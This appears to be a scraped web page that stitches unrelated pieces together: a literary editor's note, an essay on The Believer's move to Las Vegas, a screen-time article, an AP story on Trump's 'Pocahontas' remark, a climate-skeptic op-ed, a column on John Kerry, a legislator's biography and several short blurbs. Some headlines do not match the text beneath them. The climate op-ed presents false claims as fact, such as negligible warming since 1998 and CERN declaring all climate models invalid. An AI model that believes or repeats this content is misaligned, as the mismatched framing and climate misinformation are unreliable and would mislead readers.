Then, after Charlie died, I found the story of Felix and the Professor, a novel that was alive in its language, arresting in its ideas, and humanly engaging in its depiction of a friendship between two painfully isolated men. Like the television at the bottom of the closet, it pulsed with warmth. The question was how to disentomb it.
6.
I had been struggling to edit the novel — I could feel its shape but was groping for a center of gravity — when one day while sorting through Charlie’s papers, one of those envelopes containing a single cut-out sentence dropped from a yellowed folder and landed at my feet. I picked it up, pulled out the scrap of paper and read, if not exactly a synopsis of the book, a clear answer to the Professor’s question.
It was as if a series of flat, flickering images had suddenly merged into a three-dimensional figure and the figure had eyes that were looking into your own. The idea of “reversing” civilization was the book’s continuous line, though it dipped in and out of view, submerged at times by other lines. Previous books of Charlie’s contained it as well: “Hey, let’s get some dinner. Be civilized,” says one of the unpleasant characters in White Jazz, a cruelly cartooned airhead feminist. “What’s civilized about dinner?” the Charlie-esque protagonist retorts.
I was elated, of course, but also chilled. In Partial Disgrace is positive and hopeful in that Felix is fully alive (unlike his weak, scolding counterpart, Dr. Freud), but what makes him so is his wrathful rejection of society, especially the institution of family.
Essentially the book portrays a man who, in true Nietzschean fashion, wills his way past cant and technobabble and bad art and the disorienting spirals of inflation — all the bad actors of our time — to becoming historical, to claiming a place in time. However, in spite of this, or perhaps because of it, at the end of the book one of Felix’s key connections fails: the Professor commits one of those unforgivable aesthetic violations, and in his fury Felix is unmasked as a malevolent demon who wields art (like Charlie, Felix is writing a book he can’t finish) as a weapon, to “be brought to bear against the cult of family values and civil society in general.” If you remember the end of Notes from Underground, you know the feeling this brings. It is the most wretched and exhilarating ending to any book I have ever read.
7.
And then last summer, while organizing Charlie’s papers, I came across another important document: a letter from an assistant doing research for him in the New York Public Library. The date: 1983, earlier than any other indication I’d seen of when Charlie started working on In Partial Disgrace. Did he ever envision the book would take 30 years? Had he known, if he had been able, what would he have changed? Nothing, I suspect. If you as a writer were given the choice — family, sanity and health on one hand, and The Book on the other — which would you pick? Especially if that book, or even just part of it, turned out exactly the way you wanted: perfect, dark, and unique.
[Editor’s Note: This essay appears, in slightly different form, as the Editor’s Note to In Partial Disgrace, published this month by Dalkey Archive Press]

Enjoyed this essay very much and it sparked a couple of ideas:
a.) Rather than a “substitute” for life, reading is sometimes a “balm” that can provide some blessed relief from life, when life is horrible. Sitting next to the dying, 24-7 caregiving of someone with dementia, visiting someone in rehab for the fifth time, waiting for them to come out of their group therapy meeting. “Jeeves and Wooster” is great for these sorts of things.
b.) Reading can help the artist “build” a new world. I love the story about Bram Stoker immersing himself in books about Eastern Europe while writing “Dracula.” He never ended up visiting himself.
c.) Remember reading a wonderful, haunting “strange story” of Robert Aickman called “Never Visit Venice” before, and rereading it after a trip to Venice. Hints and glimpses suggesting the inspiration for Aickman’s story were so much clearer after the trip.
That’s all for now! Hungry for fiction now, and a bit surfeited on political reading!

Fear and Literati in Las Vegas: On ‘The Believer’s’ Move to Sin City
Essays
Dan Hernandez May 9, 2017 | 12 books mentioned 3 5 min read
ZZ Packer donned a judge’s robe and banged the gavel for a trial argument-themed reading inside an old federal courthouse. Later, Miranda July read aloud the sexual fantasies of 30 women in her audience. And before each of those, Luís Alberto Urrea shared psalms about his Tijuana childhood as hummingbirds bobbed, a coyote yipped, and the sun fell behind sandstone bluffs at Red Rock Canyon, where the first reading took place.
The “American Dreams” festival on April 21 to 22 in Las Vegas was as quirky, earnest, and sprawling an occasion as you’d expect from a happening co-organized by The Believer magazine and Black Mountain Institute (BMI), the literary center based at the University of Nevada, Las Vegas. Jim James from My Morning Jacket performed. And Dave Eggers interviewed Carrie Brownstein about her serial reinventions as a rock star, writer, actor, director, and wedding officiator. Young talents from UNLV’s creative writing program and McSweeney’s 826 workshops took the stage. The inaugural event was a welcome twist on the staid book-fest format. But it was the weekend’s nuptial vibe that left me, and other local and visiting writers, most intrigued for what’s yet to come.
After 14 years in the McSweeney’s family The Believer is moving to Las Vegas to be edited and published at BMI. Joshua Wolf Shenk, the institute’s executive director, joked during “American Dreams” that the two had started dating during the festival planning process, and this being the wedding capital of the world, they’ve decided to elope. The magazine’s founders, Vendela Vida and Heidi Julavits, will act as consultants while Shenk — author of Lincoln’s Melancholy and Powers of Two — will serve as editor. The Believer was on a printing hiatus in 2016 but will re-launch in that form on August 1. As before, its contributors will be based around the U.S., but BMI is seeking a managing editor to work from Las Vegas.
To recap for those who are skeptical: Yes, a national arts and culture magazine that prides itself on earnestness will be headquartered in Sin City. Indeed, Las Vegas has a thriving literary community (which, ahem, also includes the lit journal I help edit, Witness). The fact that there’s a “Man Bites Dog” newsyness to some of this is precisely why it has transformative potential.
The vows columns might note that The Believer and Las Vegas share a certain weirdness, both being colorful products that were designed to spite the landscapes that bore them. A wedding toast might say that bringing indie culture to the ultimate resort town is a great McSweeneyian adventure. But who cares about that? I’m excited for it because Las Vegas is always troubled, always relevant, and so an ideal place for the literati to set-up a magazine bureau.
Julavits, The Believer’s founding editor, said during a pop-up reading on the eve of “American Dreams” that Las Vegas was already the magazine’s spiritual home. One of its most-heralded (or depending on your view of fact-checking, notorious) essays was John D’Agata’s “What Happens There” about a Las Vegas teen suicide and the affecting, tawdry details that surrounded it. That essay’s title nicely deleted Sin City’s promise to keep all misdeeds local, and the book adaptation, About A Mountain, followed suit with a collage of facts and interviews that evoke stark human truths about Southern Nevada. The region’s economic woes, toxic policies, social isolation, and impending environmental crises have rarely been so poetically aggregated. But that book came out in 2010. Here are some 2016-2017 facts about Nevada’s national standing that deserve a fresh look: third highest unemployment rate in the U.S., number one in underemployment, sixth in home foreclosures, third highest drug overdose and suicide rates, number one in gambling addiction, 51st in public education.
Hopes are that while The Believer will remain unfettered in its scope, Las Vegas will influence its creative and moral urgencies if not directly inspire another essay or two. More than 75 percent of the state’s population lives in the Las Vegas Valley, where there’s obviously much to glean about the American experience. Nevada also has the largest percentage of undocumented immigrants in the nation, a tense urban-rural divide, public lands fights, and a water shortage attributed to climate change. During his savage journey into this desert Hunter S. Thompson stated that the American dream resides “somewhere in the Las Vegas area” — not somewhere on the strip. Yet when it comes fiction, festival participant Laura McBride’s debut book We Are Called to Rise, Vu Tran’s Dragonfish, and Donna Tartt’s Pulitzer-winning The Goldfinch are the only recent novels I can think of that captured this city as more than a row of shimmeringtowers packed with gamblers and prostitutes.
At a bar in the El Cortez, Las Vegas’s oldest and most-revered budget casino, right before the pop-up reading on the festival’s eve, I listened to the local poet and festival reader Angelo Ligori riff about the way people describe the building’s smell. “It’s always like cigarette ash and broken dreams,” he said, “carpet cleaner and addiction, perfume and sadness — a specific detail and like a grim takeaway.” I laughed, knowing I’m guilty of those myself. Yet I prefer former BMI fellow Timothy O’Grady’s assessment that casinos are “like morgues for the half-dead,” my own footnote being that thanks to a few strong unions, the resorts also allow tens of thousands of low-skill workers to enjoy middle-class lives. While Vegas is known as a “last chance city for last chance people,” it’s a place, too, where a cocktail waitress can provide her kids with good healthcare and purchase a home.
Locals are keen for Vegas stories that show more depth and nuance, and which look beyond the stip. At the El Cortez event the readers had to compete with slot machine bells and jackpot music every time a door opened to the room, which encapsulated the challenge writers face in breaking through the cacophony of noise and lights that leave anyone curious about this city googly-eyed. Taking instead a bird’s-eye view reveals how pernicious that distraction can be. Both Donald Trump and Steve Wynn, the Republican National Committee’s finance chair, have their names written in gold letters on the skyline, and Nevada’s largest newspaper was purchased in 2016 by their ally, billionaire casino mogul Sheldon Adelson. A local first-amendment lawyer once told me this is the last American oligarchy; anyone interested in exploring that issue should fly out. But, to ride the bird-eye metaphor to its grave, it’s also a place where light pollution kills. Birds come here to feed on moths and end up smacking into reflective glass.
Fortunately, “American Dreams” wasn’t devoid of politics. At the courthouse reading ZZ Packer delivered a farcical New York Times bestseller list for the Trump era in which books like What to Expect When You’re Expecting Political Change and To Russia with Love made the cut. At the Red Rock Canyon reading, Heidi Julavits shared a madcap sex dream involving the 45th president, and then when a helicopter flew overhead, she yelled, “Oh f—, here he comes!” There were immigration stories and lyrical calls for resistance. By turns poignant and gonzo, it offered the boost of idealism, humor, and anger that Southern Nevada has been desperate for.
At one point Brownstein said, “Las Vegas is a good place to cry alone in your car.” That joke rubbed some locals the wrong way. But if, when The Believer settles in, it turns its gaze on this landscape, with more how and why to go with that quickie gross impression, perhaps the same locals will shed a few cathartic tears.

Screen time for children: Good, bad, or it depends?
February 20, 2019 Staff Reporter Community News, Education, Environment, Health, Social Media 0
This is not the first time when technological advances have created a virtual riot in homes, schools, and offices. When telephones were first introduced in the late 1800s, debates ensued about whether they would interfere with office comradery and whether clients would find a call more off-putting than a face-to-face conversation. Television caused a similar stir as scientists and families debated whether the old-fashioned definition of screen time would create a generation of couch potatoes who could no longer think or communicate. So, the current spat over a more modern “screen time” that includes television, smartphones, tablets, and the varied media developed on these platforms is really nothing new. Yet, the debate rages on: Is screen time in its modern guise bad or good for children—and for us?
The past few weeks have seen a flurry of new pieces speaking to the hazards or benefits of screen time. In January, Jordan Shapiro released his new book, “The New Childhood: Raising Kids to Thrive in a Connected World.” In this beautifully written text, Shapiro argues that screen time is here to stay and that children must merely learn how to navigate it well so that they do not overdose or view content that is not healthy for development. Again—not new. Similar discussions were popular as televisions became an indispensable feature of home life. The science, however, reassured us. If time on the tube could be monitored and we could ensure that our young children were not watching gunfire and gang fights, some kids could even benefit from educational TV. In short, the results suggested that “Sesame Street” and “Blues Clues” were great, and the nightly news should be avoided. However, the picture that emerged was more nuanced than “Is television bad or good?” and the answer to the question became “It depends.”
The crop of papers that appeared in the past few weeks suggest this more nuanced approach for digital screen time. On the one hand, the Royal College of Paediatrics and Child Health in London noted that children between the ages of 11-24 were spending approximately 2.5 hours on the computer, 3 hours on their phone, and 2 hours on the television per day. Did that amount of viewing hurt them in some obvious and measurable way? Looking at 940 research abstracts, the Royal College did find associations—though not causal links—between screen time and a less healthy diet, less energy, and higher obesity rates. There were also data linking screen time to poorer mental health. Yet, in the last week, a report also suggested that even these associations are weak at best, with new data touting that teen engagement with social media (screen viewing) is not associated with depression.
The inconclusive results and contradictory findings led the Royal College to conclude that a causal chain between screen watching and bad outcomes could not be established. It thus recommended that we find balance between screen and non-screen time—a balance that is dependent on the nature of the child (temperament), the child’s age, and the content in question.
This advice is consistent with Shapiro’s take. In the past few weeks, however, we have also seen several new studies that continue to raise a red flag. In one, we learn that increased face-to-face interactions emerge when we put Facebook use on hold for a year. In another, we learn that when we carry our phones in our pockets, have them on a desk in front of us, or have them more distant from us—in another room—we get different results on cognitive tasks. As you might guess, we do better when our phones are in another room. And at the end of January, we were told by author Sheri Madigan and her colleagues in the pediatric journal JAMA that screen time at 24 months of age relates to lower outcomes at 36 months and that screen time at 36 months relates to lower performance on a developmental screening task when the same children were 60 months of age. This latter study suffered from a few limitations that the authors themselves own: They lumped all screen time—computer, gaming systems, television—together and the effects they report, while significant, were not strong. Nonetheless, the results were suggestive: More screen time does likely reduce other activities children need to participate in to learn and grow.
What are educators and parents to do with this flurry of messages? Perhaps it is time for that more nuanced approach. Screens—be they television or computers—can transport us to places we have only imagined. They can present narratives that enrich our understanding of the world. At the same time, they can eat up precious time and draw our attention away from important human-to-human contact.
To date, the science cannot definitively say that there is a threshold for screen time use after which it is harmful for children. What the science can tell us, however, is that face-to-face interactions are critically important for development and that sometimes the digital technology gets in the way. When adults model poor screen manners by picking up a phone call in the middle of a conversation and fail to teach children how to wisely choose among social media options, then they do so at their own risk. It is our job as adults to help children wisely choose which programs to watch and for how long. Shapiro suggests that when we do this, we will need less surveillance of our children and their digital habits. We can become more like mentors, guiding children to make smart choices until they are old enough to do so—all while protecting their time to engage in crucial human relationships and generate their own imaginative worlds.

'PUNCH IN THE GUT!' All charges dropped against Jussie Smollett!
By Laurie Kellman and Catherine Lucey, THE ASSOCIATED PRESS
WASHINGTON — U.S. President Donald Trump returned to his own kind of code talking Monday by deriding Democratic Sen. Elizabeth Warren as “Pocahontas” at a White House event honouring Native American war heroes.
“You were here long before any of us were here,” Trump said as he honoured three Navajo code talkers from the Second World War. And then he added, without naming Warren: “We have a representative in Congress who they say was here a long time ago. They call her Pocahontas. But you know what, I like you.”

In fact, Trump deployed that nickname for the Massachusetts senator repeatedly during the 2016 presidential campaign and, as president, as recently as a Nov. 3 tweet.
Pocahontas just stated that the Democrats, lead by the legendary Crooked Hillary Clinton, rigged the Primaries! Lets go FBI & Justice Dept.
— Donald J. Trump (@realDonaldTrump) November 3, 2017
Native American leaders have called Trump’s past attacks on Warren offensive and distasteful. Some Democrats have called the nickname racist.
Trump made the comment as he stood near a portrait of President Andrew Jackson, which he hung in the Oval Office in January. Trump admires the seventh president’s populism. But Jackson also is known for signing the Indian Removal Act of 1830, in which the Cherokee Nation was removed from its lands in what is now known as the “trail of tears.”
The Navajo Nation suggested Trump’s remark Monday was an example of “cultural insensitivity” and resolved to stay out of the “ongoing feud between the senator and President Trump.”
“All tribal nations still battle insensitive references to our people. The prejudice that Native American people face is an unfortunate historical legacy,” Navajo Nation President Russell Begaye said in a statement. He added that the Navajo Nation remains honoured by the White House recognition of the code talkers.
White House spokeswoman Sarah Huckabee Sanders, asked about criticism of Trump’s remarks, said a racial slur “was certainly not the president’s intent.”
But the remark is the latest in a long list of remarks Trump has made about people from specific ethnic and racial groups. Announcing his longshot campaign for president in 2015, Trump said many Mexican immigrants are rapists. He’s sought to ban immigrants from certain Muslim majority nations. He’s come under fire for what some said was a too-slow federal response to hurricane damage in Puerto Rico. Trump also raised eyebrows for apparently having some fun in October with the name of the U.S. territory — “Puerrrto Rico,” he said — at an East Room event for Puerto Ricans.
Those in the Oval Office for Monday’s event gave no visible reaction to Trump’s “Pocahontas” comments. But Warren and other Democrats were quick to respond.
“This was supposed to be an event to honour heroes, people who put it all on the line for our country, who, because of their incredible work, saved the lives of countless Americans and our allies,” Warren said in an interview on MSNBC. “It is deeply unfortunate that the president of the United States cannot even make it through a ceremony honouring these heroes without having to throw out a racial slur.”
New Mexico Sen. Sen. Tom Udall, vice chairman of the Indian Affairs committee, added: “Donald Trump’s latest racist joke — during Native American Heritage Month no less — demeaned the contributions that the code talkers and countless other Native American patriots and citizens have made to our great country.”

The president has long feuded with Warren, an outspoken Wall Street critic who levelled blistering attacks on Trump during the campaign. Trump seized on questions about Warren’s heritage, which surfaced during her 2012 Senate race challenging incumbent Republican Sen. Scott Brown.
During that campaign, law school directories from the Association of American Law Schools from 1986 to 1995 surfaced that put Warren on the association’s list of “minority law teachers” when she was teaching at the University of Texas and the University of Pennsylvania. Warren said she listed herself with Native American heritage because she hoped to meet people with similar roots.
In a 2012 interview with The Associated Press, Warren said she and her brothers were told of the family’s heritage by their parents, the late Don and Pauline Herring.
Brown pressed Warren to release more information about how she described her heritage to potential employers. Warren said she never sought proof of ancestry because she didn’t think it was necessary.
Sanders said Monday that Warren was the offensive one when “she lied about something specifically to advance her career.”

Russiagate -- a Bright, Shining Lie
Nine years ago, President Obama’s Environmental Protection Agency issued an “Endangerment Finding,” claiming man-made global warming posed an imminent threat to Americans. The Finding, however, was based on computerized climate models that couldn’t even successfully hind-cast the weather we’d had over the past century—much less forecast earth’s climate 100 years into the future. The earth’s climate has always changed, often abruptly.
EPA essentially asserted that 80 percent of our energy “warmed the earth” and represented a long-term risk. Obama’s team thus bet in 2009 that the earth’s strong warming from 1976–98 would continue. But it didn’t. Never mind all those recent “hottest year” claims from NOAA and NASA. Satellites, our most honest indicator, say our planet’s temperature has risen an insignificant 0.02 degrees C since 1998.
Despite the 20-year non-warming, which clearly shows that the models are worthless for prediction, the Federal Appeals Court in Washington recently blocked a new natural gas pipeline’s regulatory approval. This ruling encourages Greens to keep thinking they can regulate gas and oil production and transport into oblivion. Alarmists across the country are already citing the new precedent in other cases, in effect demanding re-hearings on Trump’s whole Energy Plan.

If the courts decree that pipelines have dangerous methane emissions, the U.S. will be unable to generate electricity except at the infamous whimsies of winds and sunshine. But the models’ prediction of dangerously rising temperatures have proven wrong. The disparity between the models’ predictions and the thermometer readings is growing wider by the day.
In science, if your theory doesn’t take account of all the relevant data, you need a new theory.
Meanwhile, thousands of new coal-fired power plants are being built around the world - -even in Europe. (Many Third world plants are being built with Chinese financing.) The CO2 from this new coal-fired power will dwarf whatever emissions the judges hope to prevent in America.
The President now risks losing the economic growth and the millions of new jobs that abundant energy should create. Without new pipelines, our “miraculous” fracked gas will be trapped in the semideserts and mountains where the gas is found. (Could gasoline prices then soar back to $4?)
What danger can today’s EPA find in earth’s current 20-year non-warming? What ice-melt will that trigger? What sea level rise? World food production has just set a new record, importantly because higher CO2 levels in the atmosphere act like fertilizer for crop plants.
Justice Neil Gorsuch’s confirmation to the Supreme Court should strongly encourage a Trump Endangerment reversal. Gorsuch stated in a 2016 opinion that the so-called Chevron Precedent, which says the courts should defer to Federal judges on laws that are ambiguous, is “difficult to square with the Constitution.” He believes it shifts too much power from Congress to unelected bureaucrats.
EPA Administrator Scott Pruitt will need to build a strong case for the reversal, however, because the Supreme Court still does not have a reliable 5–4 conservative majority. Pruitt’s current approach of setting up competing red-team vs. blue team must help convince Justice Kennedy that the world today looks much different than when the EPA rubberstamped the IPCC and the failed climate models.
The science was not settled in 2009; and, fortunately, the weight of evidence has since shifted importantly toward the skeptics. It starts with the still-continuing 20-year non-warming. The best “answer”’ the alarmists can find is that “extra” CO2 heat is hiding in the deep ocean depths. But cold water is heavier than warm water, so the warm water would have warmed the depths on its way down. NASA’s newer and more-accurate data comes from ARGO floats that periodically dive to sample water temperatures 2100 feet below the surface. They find no hidden heat.
Moreover, the earth has been warming, erratically but persistently, since 1715. How much of this warming was due to the natural cycles, and how much was man-made (including land-clearing, irrigation, expanding Urban Heat Islands and CO2)? The skeptics contend CO2 adds a barely significant one degree C. Alarmists claim up to 12 degrees C for CO2!
How did hurricanes Harvey, Irma, and Maria destroy so much with only 0.02 degree C of warming? Britain’s wooden-ship logbooks from 1700–1850 confirm twice as many major land-falling Caribbean hurricane per decade during the cold Little Ice Age as during the far warmer years from 1950–2000. Nor has the post-1998 weather produced more intensive storms, longer droughts, or any of the other claimed climate impacts Obama’s EPA assumed would happen.
The simple truth is that the Pacific Decadal Oscillation--not recognized until 1996—has given the world a climate scare every 25–30 years since we got thermometers about 1850. In 1845, the ships of Sir John Franklin’s Arctic expedition were crushed by ice. Just 64 years later, in 1909, Roald Amundsen sailed through a relatively warm, ice-free Northwest Passage. In the 1970s, we were warned urgently of a new Ice Age. And then came the “overheated” Al Gore years, 1976–98.
The huge Pacific’s 60-year oscillation raises ocean temperatures—and thus the world’s— by 1–2 degrees C for about 30 years, then shifts back again for another 30 years. Every time it shifted in the past, alarmists extended the current reading in a straight line for five or 20 years and screamed: “Disaster!” This time, the alarmists claim the non-warming isn’t real!

Prosecutor Admits: We Know Smollett Lied, We Dropped His Felony Charges Anyway

Today, there’s no doubt the models have predicted more than twice as much warming as we’ve observed. Given the high number of official thermometers in urban spaces and at jet-powered airports, the models may be overpredicting by three-fold!
Another major new scientific finding also goes against the alarmists. Last year CERN (the multi-billion-dollar Institute for European Nuclear Research) told subscribers to the CERN Courier that all the climate models must be re-done. CERN reported that its CLOUD experiment had used its huge particle accelerator and a giant cloud chamber to find that the sun and cosmic rays are the real “mystery factors” in earth’s climate. The research supports the contention that CO2 is only a bit player.
CERN says that during the Little Ice Age (indeed, in all the “little ice ages”) the sun was weak. This allowed far more cosmic rays to hit our atmosphere. Those extra hits shattered millions more molecules into zillions of tiny “cloud seeds.” Each cloud seed carried an electric charge that attracted other molecules to form clumps - - and gave us up to ten times as many low clouds. Earth cooled for centuries under overcast skies, as if under a giant awning. Then the sun becomes more active, the skies sunnier, and earth warmed— for centuries.
History says the Modern Warming is likely to last at least another two centuries. The Medieval Warming (at 350 years) was the shortest past warming we can find. But first, CERN says, we will have to go through a 60-year Solar Sunspot Minimum that will drop our thermometers even lower than today for another 60 years. The Minimums are another recently-recognized cycle, 200 years long.
How will a century of non-warming endanger Americans?
Trump should be eager to take on Obama’s outdated and ill-informed Endangerment Finding.

With the Mueller Investigation Finished, Russiagaters are Scrambling
Does John Kerry understand the world he inherited? Is he in denial?
Consider. At Davos, Switzerland, Kerry called it a "myth" that America is withdrawing, and "the most bewildering version of this disengagement myth is about a supposed U.S. retreat from the Middle East."
Is he serious? How else does Kerry describe Obama's pullout of all U.S. troops from Iraq, and from Afghanistan by year's end?
Syria is "someone else's civil war," says President Obama. If we do any strikes there, promised Kerry, they will be "unbelievably small," and rest assured there will be "no [U.S.] boots on the ground."
When al-Qaida and its allies seized Ramadi and Fallujah in Anbar province, Kerry rushed to the microphones: "We're not ... contemplating returning. We're not contemplating putting boots on the ground. This is their fight. ... this is a fight that belongs to the Iraqis."
Yes it is. But does this sound like the defiant "This will not stand!" of George H. W. Bush, after Saddam's invasion of Kuwait?
Moreover, a Pew poll last fall found that 52 percent of the nation approves of U.S. disengagement, saying America should "mind its own business internationally and let other countries get along the best they can on their own."
Staying out of other countries' quarrels and other nations' wars is what Americans want, and Obama is delivering.
Why does John Kerry deny the obvious?
To his credit, the secretary has undertaken three diplomatic initiatives, the success of any one of which could earn him a Nobel.

The Geneva II Conference on Syria, the U.S.-U.N. negotiations over Iran's nuclear program, and the Palestinian-Israeli peace initiative.
Yet Kerry's own undiplomatic conduct may be imperiling two of his initiatives, and naivete and hubris may be blinding him to the coming collapse of the third.
On arrival at Geneva II, Kerry demanded that Iran be disinvited, then launched into a tirade insisting that Assad get out of Damascus:
"There is no way ... that the man who led the brutal response to his own people could regain the legitimacy to govern."
Syrian Foreign Minister Walid al-Moallem was right back in his face: "No one, Mr. Kerry, has the right to provide legitimacy ... except for the Syrian people."
Dismissing Kerry's call for a transitional government without Assad, Moallem implied that not only was Kerry's position irrelevant -- Assad currently holds the whip hand in Syria and is going nowhere -- but irrational from the standpoint of U.S. national interests.
"Those doing suicide attacks in New York," Moallem instructed Kerry, "are the same as those doing it in Syria."
The Washington Post backed Moallem with a report that Ayman al-Zawahiri has called on all jihadists in Syria to line up in "one rowlike, solid structure in confronting your sectarian, secularist enemy," the Assad regime, that is backed by "Iran, Russia and China."
"What makes our hearts bleed," said Zawahiri, "is the hostile sedition, which has intensified among the ranks of the mujahideen of Islam."
Can Kerry explain why America's goal remains the ouster of Assad, when the offensive coordinator for the rebels who would take power is the successor to Osama bin Laden?
Asked what would happen should Iran backslide on the new interim nuclear agreement, Kerry rattled America's rockets:
"If they do that, then the military option that is available to the United States is ready and prepared to do what it would have to do."

We Have Another Meeting With Top Intel Officials That Occurred During Key Moments Of The Trump-Russia Investigation

Who is Kerry to threaten a war Congress has never authorized?
How does it advance diplomacy to threaten publicly to bomb your negotiating partners? Kerry talks as though he were back in the Senate.
The head of Iran's Islamic Revolutionary Guard dismissed Kerry's threat as "ridiculous," called his negotiating strategy "bankrupt" and warned that "the revolutionary people" of Iran are anxious for battle with the Americans.
If Kerry's wants a deal, how does this bellicose bluster help?
Kerry now says that Iran will have to "dismantle" centrifuges. But is not America's objective here proof positive Iran has no nuclear weapon or weapons program, and that its nuclear program is peaceful?
When did the destruction of Iranian centrifuges become the U.S. demand? Tehran has now planted its feet in concrete that there will be no dismantling of centrifuges, and "Bibi" Netanyahu is crowing that this means the failure of the talks.
As for an Israeli-Palestinian deal in which Kerry has invested 10 trips, Israeli economics minister Naftali Bennett calls it "a joke."
Defense Minister Moshe Yaalon says that Kerry "is acting out of misplaced obsession and messianic fervor," that his peace plan "is not worth the paper it is written on," that he wishes Kerry would get his Nobel prize now, and leave Israel alone.
As for Bibi, who resigned from Ariel Sharon's cabinet rather than accept a withdrawal from Gaza, he now says that not one settler on the West Bank will be uprooted, and not one settlement shut down.
Kerry is heading into a minefield. And so are we.

+ − Biography
State Representative Thomas J. Calter was sworn into office on January 6, 2007 and proudly represents constituents in his home town of Kingston, as well as Plymouth, Duxbury, Halifax, Plympton and Middleboro. Tom is currently serving his fifth term in office. He serves on four legislative committees: Global Warming and Climate Change, the Joint Committee on Higher Education, the Joint Committee on Economic Development & Emerging Technologies; and the Joint Committee on Community Development & Small Business -- areas in which he is able to bring his experience from a long career in business management and leadership to the discussions.
Tom has been a tireless advocate for the issues that improve the quality of life in the 12th Plymouth District and has fought hard for the needs of children, seniors, and veterans in Massachusetts. He has often stood alone in pursuit of laws that promote reform, transparency, and good government. He believes that everyone is entitled to a good job and sees it as government's responsibility to create an economic environment where businesses can grow and where working men and women benefit. Since 2013, he has become a leading advocate in the legislature for raising awareness on the dangers of substance abuse and the Commonwealth's growing heroin and opiate epidemic. He has presented eight Substance Abuse Awareness programs for parents and students in Plymouth County and has plans continue with more.
Tom Calter is a career businessman who holds an MBA from Northeastern University. Tom has spent the majority of his career in the environmental services industry. As a young man, he began as a laborer responding to oil spills, cleaning oil tanks, and remediating hazardous waste sites, often under difficult and dangerous conditions. He put himself through North Adams State College and after graduating, embarked on his career in business management. He has acquired, built, or reorganized more than a dozen companies in his 30 year career. He has created hundreds of jobs during that period and has proudly worked to improve wages, working conditions, and safety standards for working men and women.
Tom understands the challenges of small and large businesses. He continues to serve as an executive coach assisting established business leaders who are looking to take their careers to the next level. Tom offers valuable life and business experiences, guiding principles, and leadership skills that have proven beneficial to managers and leaders across New England.
Prior to joining the legislature, Representative Calter served his community as a member of the Kingston Finance Committee, a member of the Silver Lake Regional School Committee, and as Chairman of the Kingston Town Democratic Committee. He currently serves on the Kingston Rent Control Board.
Tom is the fourth of six children of the late Tom and Kay Calter. His dad was a carpenter and his mother a cook. Tom, his brother and four sisters were raised in the small town of Avon, Massachusetts where Tom played hockey and baseball. He attended Cardinal Spellman High School and received his Bachelors Degree from North Adams State College, where he was captain of the boxing team.
Tom has been married to his wife Patty for over 30 years. Together they have 3 adult children: Ryan, Kerri, and Patrick, and 4 grandchildren, Lucas, Parker, Jack and Brody. The Calter family has called Kingston home for over 25 years.

Physician Star Rating Description
Each patient's experience at our practice is important to us. As we strive to provide the highest level of care, we value feedback on all aspects of the patient experience. This MedicalGPS patient experience survey measures patient satisfaction from the time the appointment was made to the time the patient spent with the provider.
Visit Preparation: Measures how courteous, respectful and friendly the clinical staff was during the patient's visit.
Provider Listened: Measures how carefully the provider listens to the needs of each and every patient.
Office Wait Time: Measures how satisfied the patient was with wait time during their visit.
Patient Recommendation: Measures how likely the patient is to recommend this practice to family and friends.

Provider Listened: Measures how carefully the provider listens to the needs of each and every patient.
Office Wait Time: Measures how satisfied the patient was with wait time during their visit.

Aquarius: A Modeling System for River Basin Water Allocation
Aquarius is a software application developed by the Rocky Mountain Research Station of the U. S Forest Service and Colorado State University. The modeling system depicts the temporal and spatial allocation of water flows among competing traditional and nontraditional water uses in a river basin. The program can be used to determine economically efficient water destination strategies by systematically examining, using a nonlinear optimization technique, the feasibility of reallocating unused or marginally valuable water storage and releases in favor of alternative uses.

Mainstreaming Public-Private Partnerships in India
Facebook
Twitter

Print
The Indian economy has been delivering strong economic growth across most sectors for the last few years. However, to achieve inclusive and sustainable growth, it is vital to develop the country's infrastructure, such as power, water, roads, ports, airports, urban bus and metro lines, health and education facilities. Infrastructure demand is expected to go up to $1 trillion under India’s 12th Five-Year Plan (2012-2017).
The Government of India has therefore focused on developing several enabling tools and activities to spur private sector investments into the country through public-private partnerships (PPPs). These are vital for catalyzing investments in new infrastructure, and for efficient operation and maintenance of assets, existing and new, over their lifetime and ensuring focus on service delivery.
The ADB-India PPP Initiative
Mainstreaming PPPs in India is a joint program of ADB and the government, through India’s Department of Economic Affairs, which focus on such activities as:
capacity building of officials,
process standardization,
sector tools,
development funds, and
project development.
Since 2006, ADB has been supporting the program through seven technical assistance projects.
40243-012: Mainstreaming Public-Private Partnerships at State Level
41575-012: Mainstreaming Public-Private Partnerships at Central Line Ministries of the Government of India
42510-012: Supporting an Initiative for Mainstreaming Public-Private Partnerships for Providing Urban Amenities in Rural Areas
41643-012: Preparing the Public-Private Partnerships Pilot Projects Initiative (Mainstreaming Public-Private Partnerships)
43013-012: Assisting in Framework Development for Mainstreaming Public-Private Partnerships
42271-012: Sustaining the Government of India-ADB Initiative for Mainstreaming Public-Private Partnerships
42272-012: Deepening Capacity Building for Mainstreaming Public-Private Partnerships
The initiative will continue to evolve with the changing needs of the PPP environment in India and aid in the overall inclusive growth of the country.

Savage Arms Introduces Model 42 Takedown Series
by American Rifleman Staff - Monday, January 4, 2016
More
SUBSCRIBE
Already considered an ideal grab-and-go survival gun, Savage Arms has converted its utilitarian Model 42 combination single-shot into an even more portable Takedown version, including a Takedown Youth model. It even comes with an Uncle Mike’s Tactical Go Bag.
The combo gun's simplistic operation—staying faithful to the original Model 42—is a prime factor that makes it ideal for bugging out, plinking, hunting, or a perfect starter gun for youths. Featuring a break-action design that fires .22 LR or .22 WMR from the top barrel and .410-bore shotgun shells from the lower barrel, the gun breaks down with the push of one button.
The 20" .410-bore barrel is chambered in 3", making it possible for shooters to use both 3" and and 2½" birdshot, buckshot, slugs and many of the new personal-protection projectiles, creating an ideal close-range platform for anything from upland birds to deer and predators. The rifle barrel (.22 LR or .22 WMR), features open sights, providing additional reach and precise aiming. And given their light weight (6.1 lbs. and 4.65 lbs. for the Youth model), .410 and .22 LR (or .22 Mag.) ammunition can be carried in bulk for extended use.
The guns are stocked with a bilateral, synthetic buttstock and fore-end. For improved purchase in cold, moist climates, the fore-end and pistol grip feature a series of functional recesses, while two studs for a sling offer the option for easy transport of an assembled firearm. A soft recoil pad reduces kick from magnum-type .410 shells. Additionally, MOLLE loops for attaching it to other gear, several pockets for ammo and gear, and a robust carry strap add to the gun's appeal. MSRP: $500

LONDON (AP) — British Prime Minister Theresa May says Parliament will vote Thursday on whether to seek a delay to Britain’s March 29 departure from the European Union. May said lawmakers are at the point where they must approve a withdrawal agreement in coming days and request a short postponement to Brexit day or request a “much longer” extension from the EU to negotiate a new arrangement.

